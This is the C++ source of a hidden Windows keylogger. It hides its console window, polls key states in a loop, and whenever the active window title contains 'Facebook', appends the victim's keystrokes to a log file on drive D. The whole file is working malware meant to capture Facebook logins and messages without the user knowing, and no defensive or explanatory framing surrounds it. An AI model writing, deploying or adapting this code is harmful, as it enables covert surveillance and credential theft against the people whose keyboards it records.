#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>


using namespace std;
#define MAX_LENGTH 1000

void save_in_file(wchar_t str[])
{
    wofstream  fileS{ "D:\\zlogs.txt",ios_base::app };
    fileS << str;
    fileS.close();
}


void get_key() {
    int count = 0;

    wchar_t buf[MAX_LENGTH]; //buffer for storing key stroke


    while (1) {

        HWND handle = GetForegroundWindow();

        char target[MAX_LENGTH];
        target[MAX_LENGTH - 1] = '\0';
        if (GetWindowTextA(handle, target, MAX_LENGTH) > 0) {
            string text = target;
            string fb = "Facebook";
            if (strstr(text.c_str(), fb.c_str())) { //keylogger target only in facebook tag
                for (int i = 8; i < 223; i++) {
                    int state = GetAsyncKeyState(i);
                    if (state == 0xffff8001) {
                        if (count >= MAX_LENGTH - 3) {//check length
                            buf[MAX_LENGTH - 2] = '\n';
                            buf[MAX_LENGTH - 1] = '\0';
                            count = 0;
                            save_in_file(buf);//save to file
                        }
                        if (i >= 0x30 && i <= 0x5a) {//encouter a-z and 1-9 is not numlock
                            wchar_t c = i;
                            buf[count++] = c;
                        }
                        else if (i >= 0x60 && i <= 0x69) { //encouter numlock
                            wchar_t c = i - 0x30;
                            buf[count++] = c;
                        }
                        else if (i == VK_SPACE) buf[count++] = ' ';//encouter spacebar
                        else if (i == VK_BACK) { //encouter backspace
                            if (count - 1 > 0) count--;//  //check length
                            else count = 0;
                            buf[count] = ' ';
                        }
                        else if (i == VK_MULTIPLY) buf[count++] = '*'; //encouter * numlock
                        else if (i == VK_OEM_MINUS) buf[count++] = '-'; //encouter - numlock
                        else if (i == VK_ADD) buf[count++] = '+'; //encouter + numlock
                        else if (i == VK_SHIFT) {//encouter shif
                            wchar_t c[] = L"[SHIF ]";
                            buf[++count] = '\0';
                            count = 0;
                            save_in_file(buf);//save to file
                            save_in_file(c);
                        }
                        else if (i == VK_CONTROL) {//encouter CTRL 
                            wchar_t c[] = L" [CTRL] ";
                            buf[++count] = '\0';
                            count = 0;
                            save_in_file(buf);//save to file
                            save_in_file(c);
                        }
                        else if (i == VK_CAPITAL) {//encouter CAPS LOCK  
                            wchar_t c[] = L" [CAPSLOCK ]";
                            buf[++count] = '\0';
                            count = 0;
                            save_in_file(buf);//save to file
                            save_in_file(c);
                        }
                        else if (i == VK_MENU) {//encouter ALT 
                            wchar_t c[] = L" [ALT ]";
                            buf[++count] = '\0';
                            count = 0;
                            save_in_file(buf);//save to file
                            save_in_file(c);
                        }
                        //////////////////////////////////////////////
                        else if (i == VK_RETURN) {//encouter ENTER                           
                            buf[count++] = '\n';
                            buf[count] = '\0';
                            count = 0;
                            save_in_file(buf);//save to file
                        }//enter





                    }// end state
                }//end for
            }

        }//end getWinText

    }//end while
}

int main()
{

    //hide process console
    HWND hide;
    AllocConsole();
    hide = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hide, 0);

    get_key();//keylog


}


